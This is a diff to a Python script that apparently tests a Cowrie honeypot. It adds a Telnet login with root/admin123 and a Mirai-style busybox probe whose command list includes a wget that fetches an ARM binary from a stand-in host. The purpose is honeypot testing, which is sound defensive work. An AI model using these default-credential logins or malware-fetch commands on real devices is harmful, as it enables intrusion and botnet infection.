@@ -45,6 +45,51 @@ def attempt(host: str, port: int, user: str, password: str):
         return None
 
 
+TELNET_COMMANDS = ["enable", "sh", "/bin/busybox SMOKE", "cd /tmp; /bin/busybox wget http://198.51.100.10/bins/smoke.arm7",
+                   "exit"]
+
+
+def _strip_telnet(data: bytes) -> bytes:
+    """Drop IAC negotiation sequences; Cowrie proceeds without answers to them."""
+    out, i = bytearray(), 0
+    while i < len(data):
+        if data[i] == 255 and i + 1 < len(data):
+            i += 3 if data[i + 1] in (251, 252, 253, 254) else 2
+            continue
+        out.append(data[i])
+        i += 1
+    return bytes(out)
+
+
+def telnet_session(host: str, port: int, user: str, password: str, commands: list[str]) -> bool:
+    """A Telnet login and a few commands over a plain socket (telnetlib is gone in Python 3.13)."""
+    import socket
+
+    def read_until(sock, marker: bytes, timeout: float = 10) -> bytes:
+        sock.settimeout(timeout)
+        buf = b""
+        while marker not in buf.lower():
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            buf += _strip_telnet(chunk)
+        return buf
+
+    with socket.create_connection((host, port), timeout=10) as sock:
+        read_until(sock, b"login:")
+        sock.sendall(user.encode() + b"\r\n")
+        read_until(sock, b"password:")
+        sock.sendall(password.encode() + b"\r\n")
+        banner = read_until(sock, b"#")
+        if b"#" not in banner:
+            return False
+        for command in commands:
+            sock.sendall(command.encode() + b"\r\n")
+            time.sleep(1.2)
+            print(f"telnet$ {command}")
+    return True
+
+
 def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument("--host", default="127.0.0.1")
@@ -53,6 +98,8 @@ def main() -> int:
     parser.add_argument("--payload-url", help="also fetch this URL from inside the honeypot to test payload capture. Serve a "
                              "harmless file from a PUBLIC address you control: Cowrie's wget refuses private and "
                              "local addresses so attackers can't use the sensor to reach your network")
+    parser.add_argument("--telnet-port", type=int, help="also log in over Telnet on this port (e.g. 2323) and run "
+                                                         "a Mirai-style busybox probe")
     args = parser.parse_args()
     commands = list(COMMANDS)
     if args.payload_url:
@@ -75,6 +122,11 @@ def main() -> int:
             output = shell.recv(65535).decode(errors="replace").strip().splitlines()
             print(f"$ {command}\n  " + "\n  ".join(output[-3:]))
     client.close()
+    if args.telnet_port:
+        ok = telnet_session(args.host, args.telnet_port, "root", "admin123", TELNET_COMMANDS)
+        print("telnet session done" if ok else "telnet login failed - is [telnet] enabled in cowrie.cfg?")
+        if not ok:
+            return 1
     print("done - the shipper picks the events up within its poll interval (10s)")
     return 0
 
